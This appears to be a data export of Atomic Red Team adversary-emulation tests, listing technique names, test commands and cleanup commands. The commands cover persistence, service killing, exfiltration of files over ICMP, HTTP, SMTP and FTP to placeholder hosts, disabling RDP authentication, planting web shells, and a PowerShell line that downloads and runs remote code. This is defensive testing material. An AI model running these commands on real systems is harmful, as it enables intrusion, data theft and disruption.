nodes.name: Install MS Exchange Transport Agent Persistence
nodes.description: Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla. More details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help

nodes.name: Command for Install MS Exchange Transport Agent Persistence
nodes.description: Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path} Enable-TransportAgent #{transport_agent_identity} Get-TransportAgent | Format-List Name,Enabled

nodes.name: Cleanup for Install MS Exchange Transport Agent Persistence
nodes.description: if(Get-Command "Get-TransportAgent" -ErrorAction Ignore){ Disable-TransportAgent #{transport_agent_identity} Uninstall-TransportAgent #{transport_agent_identity} Get-TransportAgent }

nodes.name: Boot or Logon Autostart Execution: Re-opened Applications
nodes.description: Atomic Red Team technique: Boot or Logon Autostart Execution: Re-opened Applications

nodes.name: Copy in loginwindow.plist for Re-Opened Applications
nodes.description: Copy in new loginwindow.plist to launch Calculator.

nodes.name: Command for Copy in loginwindow.plist for Re-Opened Applications
nodes.description: cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist

nodes.name: Cleanup for Copy in loginwindow.plist for Re-Opened Applications
nodes.description: rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist

nodes.name: Re-Opened Applications using LoginHook
nodes.description: Mac Defaults [Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)

nodes.name: Command for Re-Opened Applications using LoginHook
nodes.description: sudo defaults write com.apple.loginwindow LoginHook #{script}

nodes.name: Cleanup for Re-Opened Applications using LoginHook
nodes.description: sudo defaults delete com.apple.loginwindow LoginHook

nodes.name: Append to existing loginwindow for Re-Opened Applications
nodes.description: Appends an entry to launch Calculator hidden loginwindow.*.plist for next login. Note that the change may not result in the added Calculator program launching on next user login. It may depend on which version of macOS you are running on.

nodes.name: Command for Append to existing loginwindow for Re-Opened Applications
nodes.description: FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1` if [ -z "${FILE}" ] ; then echo "No loginwindow plist file found" && exit 1 ; fi echo save backup copy to /tmp/ cp ${FILE} /tmp/t1547007_loginwindow-backup.plist echo before plutil -p ${FILE} echo overwriting... #{exe_path} ${FILE} && echo after && plutil -p ${FILE}

nodes.name: Cleanup for Append to existing loginwindow for Re-Opened Applications
nodes.description: rm -f #{exe_path} # revert to backup copy FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1` if [ -z "${FILE}" ] ; then exit 0 fi mv /tmp/t1547007_loginwindow-backup.plist ${FILE}

nodes.name: Serverless Execution
nodes.description: Atomic Red Team technique: Serverless Execution

nodes.name: Lambda Function Hijack
nodes.description: Modify an existing Lambda function to execute arbitrary code.

nodes.name: Command for Lambda Function Hijack
nodes.description: Import-Module "PathToAtomicsFolder/T1648/src/T1648-1/LambdaAttack.ps1" -Force $access_key = "#{access_key}" $secret_key = "#{secret_key}" $session_token = "#{session_token}" $aws_profile = "#{profile}" $region = "#{region}" Set-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region Invoke-Terraform -TerraformCommand init -TerraformDirectory "PathToAtomicsFolder/T1648/src/T1648-1" Invoke-Terraform -TerraformCommand apply -TerraformDirectory "PathToAtomicsFolder/T1648/src/T1648-1" -TerraformVariables @("profile=T1648-1", "region=$region") Invoke-LambdaAttack -AWSProfile "T1648-1" -AWSRegion $region

nodes.name: Cleanup for Lambda Function Hijack
nodes.description: Import-Module "PathToAtomicsFolder/T1648/src/T1648-1/LambdaAttack.ps1" -Force $access_key = "#{access_key}" $secret_key = "#{secret_key}" $session_token = "#{session_token}" $aws_profile = "#{profile}" $region = "#{region}" Set-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region Invoke-Terraform -TerraformCommand destroy -TerraformDirectory "PathToAtomicsFolder/T1648/src/T1648-1" -TerraformVariables @("profile=T1648-1", "region=$region") Remove-MaliciousUser -AWSProfile "T1648-1" Remove-TFFiles -Path "PathToAtomicsFolder/T1648/src/T1648-1/"

nodes.name: Email Collection: Email Forwarding Rule
nodes.description: Atomic Red Team technique: Email Collection: Email Forwarding Rule

nodes.name: Office365 - Email Forwarding
nodes.description: Creates a new Inbox Rule to forward emails to an external user via the "ForwardTo" property of the New-InboxRule Powershell cmdlet.

nodes.name: Command for Office365 - Email Forwarding
nodes.description: $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd Connect-ExchangeOnline -Credential $creds New-InboxRule -Name "#{rule_name}" -ForwardTo "#{forwarding_email}"

nodes.name: Cleanup for Office365 - Email Forwarding
nodes.description: $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd Connect-ExchangeOnline -Credential $creds Get-InboxRule | Where-Object { $_.Name -eq "#{rule_name}" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }

nodes.name: Service Stop
nodes.description: Atomic Red Team technique: Service Stop

nodes.name: Windows - Stop service using Service Controller
nodes.description: Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying it has changed to a state of STOP_PENDING. If the spooler service was not running "The service has not been started." will be displayed and it can be started by running the cleanup command.

nodes.name: Command for Windows - Stop service using Service Controller
nodes.description: sc.exe stop #{service_name}

nodes.name: Cleanup for Windows - Stop service using Service Controller
nodes.description: sc.exe start #{service_name} >nul 2>&1

nodes.name: Windows - Stop service using net.exe
nodes.description: Stops a specified service using the net.exe command. Upon execution, if the service was running "The Print Spooler service was stopped successfully." will be displayed. If the service was not running, "The Print Spooler service is not started." will be displayed and it can be started by running the cleanup command.

nodes.name: Command for Windows - Stop service using net.exe
nodes.description: net.exe stop #{service_name}

nodes.name: Cleanup for Windows - Stop service using net.exe
nodes.description: net.exe start #{service_name} >nul 2>&1

nodes.name: Windows - Stop service by killing process
nodes.description: Stops a specified service killng the service's process. This technique was used by WannaCry. Upon execution, if the spoolsv service was running "SUCCESS: The process "spoolsv.exe" with PID 2316 has been terminated." will be displayed. If the service was not running "ERROR: The process "spoolsv.exe" not found." will be displayed and it can be started by running the cleanup command.

nodes.name: Command for Windows - Stop service by killing process
nodes.description: taskkill.exe /f /im #{process_name}

nodes.name: Linux - Stop service using systemctl
nodes.description: Stops a specified service using the systemctl command. Upon execution, if the specified service was running, it will change to a state of inactive and it can be restarted by running the cleanup command. You can list all available services with following command: "systemctl list-units --type=service"

nodes.name: Command for Linux - Stop service using systemctl
nodes.description: sudo systemctl stop #{service_name}

nodes.name: Cleanup for Linux - Stop service using systemctl
nodes.description: sudo systemctl start #{service_name} 2> /dev/null

nodes.name: Linux - Stop service by killing process using killall
nodes.description: Stops a specified service by sending a SIGTERM signal to the linked process using the killall command. Upon execution, if the service's main process was running, it will be terminated. If the service was not running, no process will be found to kill and it can be restarted by running the cleanup command. You can list all available services with following command: "systemctl list-units --type=service"

nodes.name: Command for Linux - Stop service by killing process using killall
nodes.description: sudo killall -SIGTERM #{process_name}

nodes.name: Cleanup for Linux - Stop service by killing process using killall
nodes.description: sudo systemctl start #{service_name} 2> /dev/null

nodes.name: Linux - Stop service by killing process using kill
nodes.description: Stops a specified service by sending a SIGTERM signal to the linked process using the kill command. Upon execution, if the service's main process was running, it will be terminated. If the service was not running, no process will be found to kill and it can be restarted by running the cleanup command. You can list all available services with following command: "systemctl list-units --type=service"

nodes.name: Command for Linux - Stop service by killing process using kill
nodes.description: sudo kill -SIGTERM $(pgrep #{process_name})

nodes.name: Cleanup for Linux - Stop service by killing process using kill
nodes.description: sudo systemctl start #{service_name} 2> /dev/null

nodes.name: Linux - Stop service by killing process using pkill
nodes.description: Stops a specified service by sending a SIGTERM signal to the linked process using pkill. This method is effective when multiple instances of the process may be running. Upon execution, if any instances of the process were running, they will be terminated. If no instances were running, pkill will not find any processes to kill. Stopped service can be restarted by running the cleanup command. You can list all available services with following command: "systemctl list-units --type=service"

nodes.name: Command for Linux - Stop service by killing process using pkill
nodes.description: sudo pkill -SIGTERM #{process_pattern}

nodes.name: Cleanup for Linux - Stop service by killing process using pkill
nodes.description: sudo systemctl start #{service_name} 2> /dev/null

nodes.name: Abuse of linux magic system request key for Send a SIGTERM to all processes
nodes.description: Adversaries with root or sufficient privileges Send a SIGTERM to all processes, except for init. By writing 'e' to /proc/sysrq-trigger, they can forced kill all processes, except for init.

nodes.name: Command for Abuse of linux magic system request key for Send a SIGTERM to all processes
nodes.description: echo "e" > /proc/sysrq-trigger

nodes.name: File and Directory Permissions Modification
nodes.description: Atomic Red Team technique: File and Directory Permissions Modification

nodes.name: Enable Local and Remote Symbolic Links via fsutil
nodes.description: Use fsutil to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths. [reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)

nodes.name: Command for Enable Local and Remote Symbolic Links via fsutil
nodes.description: fsutil behavior set SymlinkEvaluation R2L:1 fsutil behavior set SymlinkEvaluation R2R:1

nodes.name: Cleanup for Enable Local and Remote Symbolic Links via fsutil
nodes.description: fsutil behavior set SymlinkEvaluation R2L:0 fsutil behavior set SymlinkEvaluation R2R:0

nodes.name: Enable Local and Remote Symbolic Links via reg.exe
nodes.description: Use reg.exe to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths. [reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)

nodes.name: Command for Enable Local and Remote Symbolic Links via reg.exe
nodes.description: reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d "1" /f reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d "1" /f

nodes.name: Cleanup for Enable Local and Remote Symbolic Links via reg.exe
nodes.description: reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d "0" /f reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d "0" /f

nodes.name: Enable Local and Remote Symbolic Links via Powershell
nodes.description: Use Powershell to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths. [reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)

nodes.name: Command for Enable Local and Remote Symbolic Links via Powershell
nodes.description: New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore

nodes.name: Cleanup for Enable Local and Remote Symbolic Links via Powershell
nodes.description: New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore

nodes.name: Application Window Discovery
nodes.description: Atomic Red Team technique: Application Window Discovery

nodes.name: List Process Main Windows - C# .NET
nodes.description: Compiles and executes C# code to list main window titles associated with each process. Upon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.

nodes.name: Command for List Process Main Windows - C# .NET
nodes.description: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} "#{input_source_code}" #{output_file_name}

nodes.name: Cleanup for List Process Main Windows - C# .NET
nodes.description: del /f /q /s #{output_file_name} >nul 2>&1

nodes.name: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
nodes.description: Atomic Red Team technique: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

nodes.name: Exfiltration Over Alternative Protocol - HTTP
nodes.description: A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337. Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.

nodes.name: Exfiltration Over Alternative Protocol - ICMP
nodes.description: Exfiltration of specified file over ICMP protocol. Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.

nodes.name: Command for Exfiltration Over Alternative Protocol - ICMP
nodes.description: $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }

nodes.name: Exfiltration Over Alternative Protocol - DNS
nodes.description: Exfiltration of specified file over DNS protocol.

nodes.name: Exfiltration Over Alternative Protocol - HTTP
nodes.description: Exfiltration of specified file over HTTP. Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.

nodes.name: Command for Exfiltration Over Alternative Protocol - HTTP
nodes.description: $content = Get-Content #{input_file} Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content

nodes.name: Exfiltration Over Alternative Protocol - SMTP
nodes.description: Exfiltration of specified file over SMTP. Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.

nodes.name: Command for Exfiltration Over Alternative Protocol - SMTP
nodes.description: Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}

nodes.name: MAZE FTP Upload
nodes.description: This test simulates MAZE's ransomware's ability to exfiltrate data via FTP. Upon successful execution, all 7z files within the %windir%\temp directory will be uploaded to a remote FTP server. Reference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents

nodes.name: Command for MAZE FTP Upload
nodes.description: $Dir_to_copy = "$env:windir\temp" $ftp = "ftp://#{ftp_server}/" $web_client = New-Object System.Net.WebClient $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}') if (test-connection -count 1 -computername "#{ftp_server}" -quiet) {foreach($file in (dir $Dir_to_copy "*.7z")) {echo "Uploading $file..." $uri = New-Object System.Uri($ftp+$file.name) $web_client.UploadFile($uri, $file.FullName)}} else {echo "FTP Server Unreachable. Please verify the server address in input args and try again."}

nodes.name: Cleanup for MAZE FTP Upload
nodes.description: $ftp = "ftp://#{ftp_server}/" try {foreach ($file in (dir "$env:windir\temp" "*.7z")) {$uri = New-Object System.Uri($ftp+$file.name) $ftp_del = [System.Net.FtpWebRequest]::create($uri) $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}') $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile $ftp_del.GetResponse()}} catch{}

nodes.name: Exfiltration Over Alternative Protocol - FTP - Rclone
nodes.description: Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server. [Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)

nodes.name: Command for Exfiltration Over Alternative Protocol - FTP - Rclone
nodes.description: $rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName $exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "exfil.zip" | Select-Object -ExpandProperty FullName &$rclone_bin config create ftpserver "ftp" "host" #{ftp_server} "port" #{ftp_port} "user" #{ftp_user} "pass" #{ftp_pass} &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate

nodes.name: Python3 http.server
nodes.description: An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.

nodes.name: Command for Python3 http.server
nodes.description: [ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9 if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi

nodes.name: Boot or Logon Autostart Execution: Shortcut Modification
nodes.description: Atomic Red Team technique: Boot or Logon Autostart Execution: Shortcut Modification

nodes.name: Shortcut Modification
nodes.description: This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell; gci -path "C:\Users" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern "exe" | FL. Upon execution, calc.exe will be launched.

nodes.name: Command for Shortcut Modification
nodes.description: echo [InternetShortcut] > #{shortcut_file_path} echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path} #{shortcut_file_path}

nodes.name: Cleanup for Shortcut Modification
nodes.description: del -f #{shortcut_file_path} >nul 2>&1

nodes.name: Create shortcut to cmd in startup folders
nodes.description: LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" to view the new shortcut.

nodes.name: Command for Create shortcut to cmd in startup folders
nodes.description: $Shell = New-Object -ComObject ("WScript.Shell") $ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk") $ShortCut.TargetPath="cmd.exe" $ShortCut.WorkingDirectory = "C:\Windows\System32"; $ShortCut.WindowStyle = 1; $ShortCut.Description = "T1547.009."; $ShortCut.Save() $Shell = New-Object -ComObject ("WScript.Shell") $ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk") $ShortCut.TargetPath="cmd.exe" $ShortCut.WorkingDirectory = "C:\Windows\System32"; $ShortCut.WindowStyle = 1; $ShortCut.Description = "T1547.009."; $ShortCut.Save()

nodes.name: Cleanup for Create shortcut to cmd in startup folders
nodes.description: Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk" -ErrorAction Ignore Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk" -ErrorAction Ignore

nodes.name: Hijack Execution Flow: Services Registry Permissions Weakness
nodes.description: Atomic Red Team technique: Hijack Execution Flow: Services Registry Permissions Weakness

nodes.name: Service Registry Permissions Weakness
nodes.description: Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg. reg add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /f /v ImagePath /d "C:\temp\AtomicRedteam.exe"

nodes.name: Command for Service Registry Permissions Weakness
nodes.description: get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL

nodes.name: Service ImagePath Change with reg.exe
nodes.description: Change Service registry ImagePath of a bengin service to a malicious file

nodes.name: Command for Service ImagePath Change with reg.exe
nodes.description: reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /f /v ImagePath /d "#{malicious_service_path}"

nodes.name: Cleanup for Service ImagePath Change with reg.exe
nodes.description: sc.exe delete #{weak_service_name}

nodes.name: Modify Cloud Compute Infrastructure: Create Snapshot
nodes.description: Atomic Red Team technique: Modify Cloud Compute Infrastructure: Create Snapshot

nodes.name: AWS - Create Snapshot from EBS Volume
nodes.description: Creates an EBS snapshot in AWS using the AWS CLI. This simulates an adversary duplicating volume data via snapshots for persistence or exfiltration.

nodes.name: Command for AWS - Create Snapshot from EBS Volume
nodes.description: aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description "Atomic Red Team Test Snapshot" --query "SnapshotId" --output text

nodes.name: Cleanup for AWS - Create Snapshot from EBS Volume
nodes.description: SNAPSHOT_ID=$(aws ec2 describe-snapshots --region #{aws_region} --filters "Name=volume-id,Values=#{aws_volume_id}" --query "Snapshots[0].SnapshotId" --output text) if [ "$SNAPSHOT_ID" != "None" ]; then aws ec2 delete-snapshot --region #{aws_region} --snapshot-id "$SNAPSHOT_ID" fi

nodes.name: Azure - Create Snapshot from Managed Disk
nodes.description: Creates a snapshot of a managed disk in Azure using the Azure CLI. Simulates adversary snapshotting behavior for persistence or data duplication.

nodes.name: Command for Azure - Create Snapshot from Managed Disk
nodes.description: az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus

nodes.name: Cleanup for Azure - Create Snapshot from Managed Disk
nodes.description: az snapshot delete --resource-group #{azure_resource_group} --name #{azure_snapshot_name}

nodes.name: GCP - Create Snapshot from Persistent Disk
nodes.description: Creates a snapshot of a persistent disk in GCP using the gcloud CLI. Emulates adversary behavior to gain access to volume data or replicate environment state.

nodes.name: Command for GCP - Create Snapshot from Persistent Disk
nodes.description: gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone}

nodes.name: Cleanup for GCP - Create Snapshot from Persistent Disk
nodes.description: gcloud compute snapshots delete #{gcp_snapshot_name} --quiet

nodes.name: File and Directory Permissions Modification: Windows File and Directory Permissions Modification
nodes.description: Atomic Red Team technique: File and Directory Permissions Modification: Windows File and Directory Permissions Modification

nodes.name: Take ownership using takeown utility
nodes.description: Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, "SUCCESS" will be displayed for the folder and each file inside of it.

nodes.name: Command for Take ownership using takeown utility
nodes.description: takeown.exe /f #{file_folder_to_own} /r

nodes.name: cacls - Grant permission to specified user or group recursively
nodes.description: Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If "Access is denied" is displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, "Successfully processed 3 files" will be displayed.

nodes.name: Command for cacls - Grant permission to specified user or group recursively
nodes.description: icacls.exe #{file_or_folder} /grant #{user_or_group}:F

nodes.name: attrib - Remove read-only attribute
nodes.description: Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed. Open the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.

nodes.name: Command for attrib - Remove read-only attribute
nodes.description: attrib.exe -r #{file_or_folder}\*.* /s

nodes.name: attrib - hide file
nodes.description: Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that the victim does not see the file.

nodes.name: Command for attrib - hide file
nodes.description: mkdir #{file_or_folder} >nul 2>&1 echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt attrib.exe +h #{file_or_folder}\T1222.001_attrib1.txt attrib.exe +h #{file_or_folder}\T1222.001_attrib2.txt

nodes.name: Cleanup for attrib - hide file
nodes.description: del /A:H #{file_or_folder}\T1222.001_attrib*.txt >nul 2>&1

nodes.name: Grant Full Access to folder for Everyone - Ryuk Ransomware Style
nodes.description: Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\ drive for Everyone. **icacls "C:\*" /grant Everyone:F /T /C /Q** However, for this atomic we set the permission on C:\Users\Public so it completes faster and doesn't irreversibly affect the host. You can set your own path variable to "C:\*" if you prefer.

nodes.name: Command for Grant Full Access to folder for Everyone - Ryuk Ransomware Style
nodes.description: icacls "#{path}" /grant Everyone:F /T /C /Q

nodes.name: Cleanup for Grant Full Access to folder for Everyone - Ryuk Ransomware Style
nodes.description: icacls '#{path}' /restore #{file_path} /q >nul 2>&1

nodes.name: SubInAcl Execution
nodes.description: This test simulates an adversary executing the Windows Resource kit utility SubInAcl. This utility was abused by adversaries in the past in order to modify access permissions. Upon execution, a process creation log should be generated indicating successful execution.

nodes.name: Command for SubInAcl Execution
nodes.description: "C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe"

nodes.name: Remote Services: Remote Desktop Protocol
nodes.description: Atomic Red Team technique: Remote Services: Remote Desktop Protocol

nodes.name: RDP to DomainController
nodes.description: Attempt an RDP session via Remote Desktop Application to a DomainController.

nodes.name: Command for RDP to DomainController
nodes.description: $Server=#{logonserver} $User = Join-Path #{domain} #{username} $Password="#{password}" cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password mstsc /v:$Server echo "RDP connection established"

nodes.name: Cleanup for RDP to DomainController
nodes.description: $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }

nodes.name: Changing RDP Port to Non Standard Port via Powershell
nodes.description: Changing RDP Port to Non Standard Port via Powershell

nodes.name: Command for Changing RDP Port to Non Standard Port via Powershell
nodes.description: Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port} New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}

nodes.name: Cleanup for Changing RDP Port to Non Standard Port via Powershell
nodes.description: Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{OLD_Remote_Port} Remove-NetFirewallRule -DisplayName "RDPPORTLatest-TCP-In" -ErrorAction Ignore Get-Service TermService | Restart-Service -Force -ErrorAction Ignore

nodes.name: Changing RDP Port to Non Standard Port via Command_Prompt
nodes.description: Changing RDP Port to Non Standard Port via Command_Prompt

nodes.name: Command for Changing RDP Port to Non Standard Port via Command_Prompt
nodes.description: reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}

nodes.name: Cleanup for Changing RDP Port to Non Standard Port via Command_Prompt
nodes.description: reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} /f >nul 2>&1 netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1 net stop TermService /y >nul 2>&1 net start TermService >nul 2>&1

nodes.name: Disable NLA for RDP via Command Prompt
nodes.description: Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt Disabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/ See also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py

nodes.name: Command for Disable NLA for RDP via Command Prompt
nodes.description: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f

nodes.name: Cleanup for Disable NLA for RDP via Command Prompt
nodes.description: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f >nul 2>&1

nodes.name: Server Software Component: Web Shell
nodes.description: Atomic Red Team technique: Server Software Component: Web Shell

nodes.name: Web Shell Written to Disk
nodes.description: This test simulates an adversary leveraging Web Shells by simulating the file modification to disk. Idea from APTSimulator. cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx

nodes.name: Command for Web Shell Written to Disk
nodes.description: xcopy /I /Y "#{web_shells}" #{web_shell_path}

nodes.name: Cleanup for Web Shell Written to Disk
nodes.description: del #{web_shell_path}\b.jsp /q >nul 2>&1 del #{web_shell_path}\tests.jsp /q >nul 2>&1 del #{web_shell_path}\cmd.aspx /q >nul 2>&1

nodes.name: Group Policy Discovery
nodes.description: Atomic Red Team technique: Group Policy Discovery

nodes.name: Display group policy information via gpresult
nodes.description: Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer The /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/ Turla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf

nodes.name: Command for Display group policy information via gpresult
nodes.description: gpresult /z

nodes.name: Get-DomainGPO to display group policy information via PowerView
nodes.description: Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.

nodes.name: Command for Get-DomainGPO to display group policy information via PowerView
nodes.description: powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"

nodes.name: WinPwn - GPOAudit
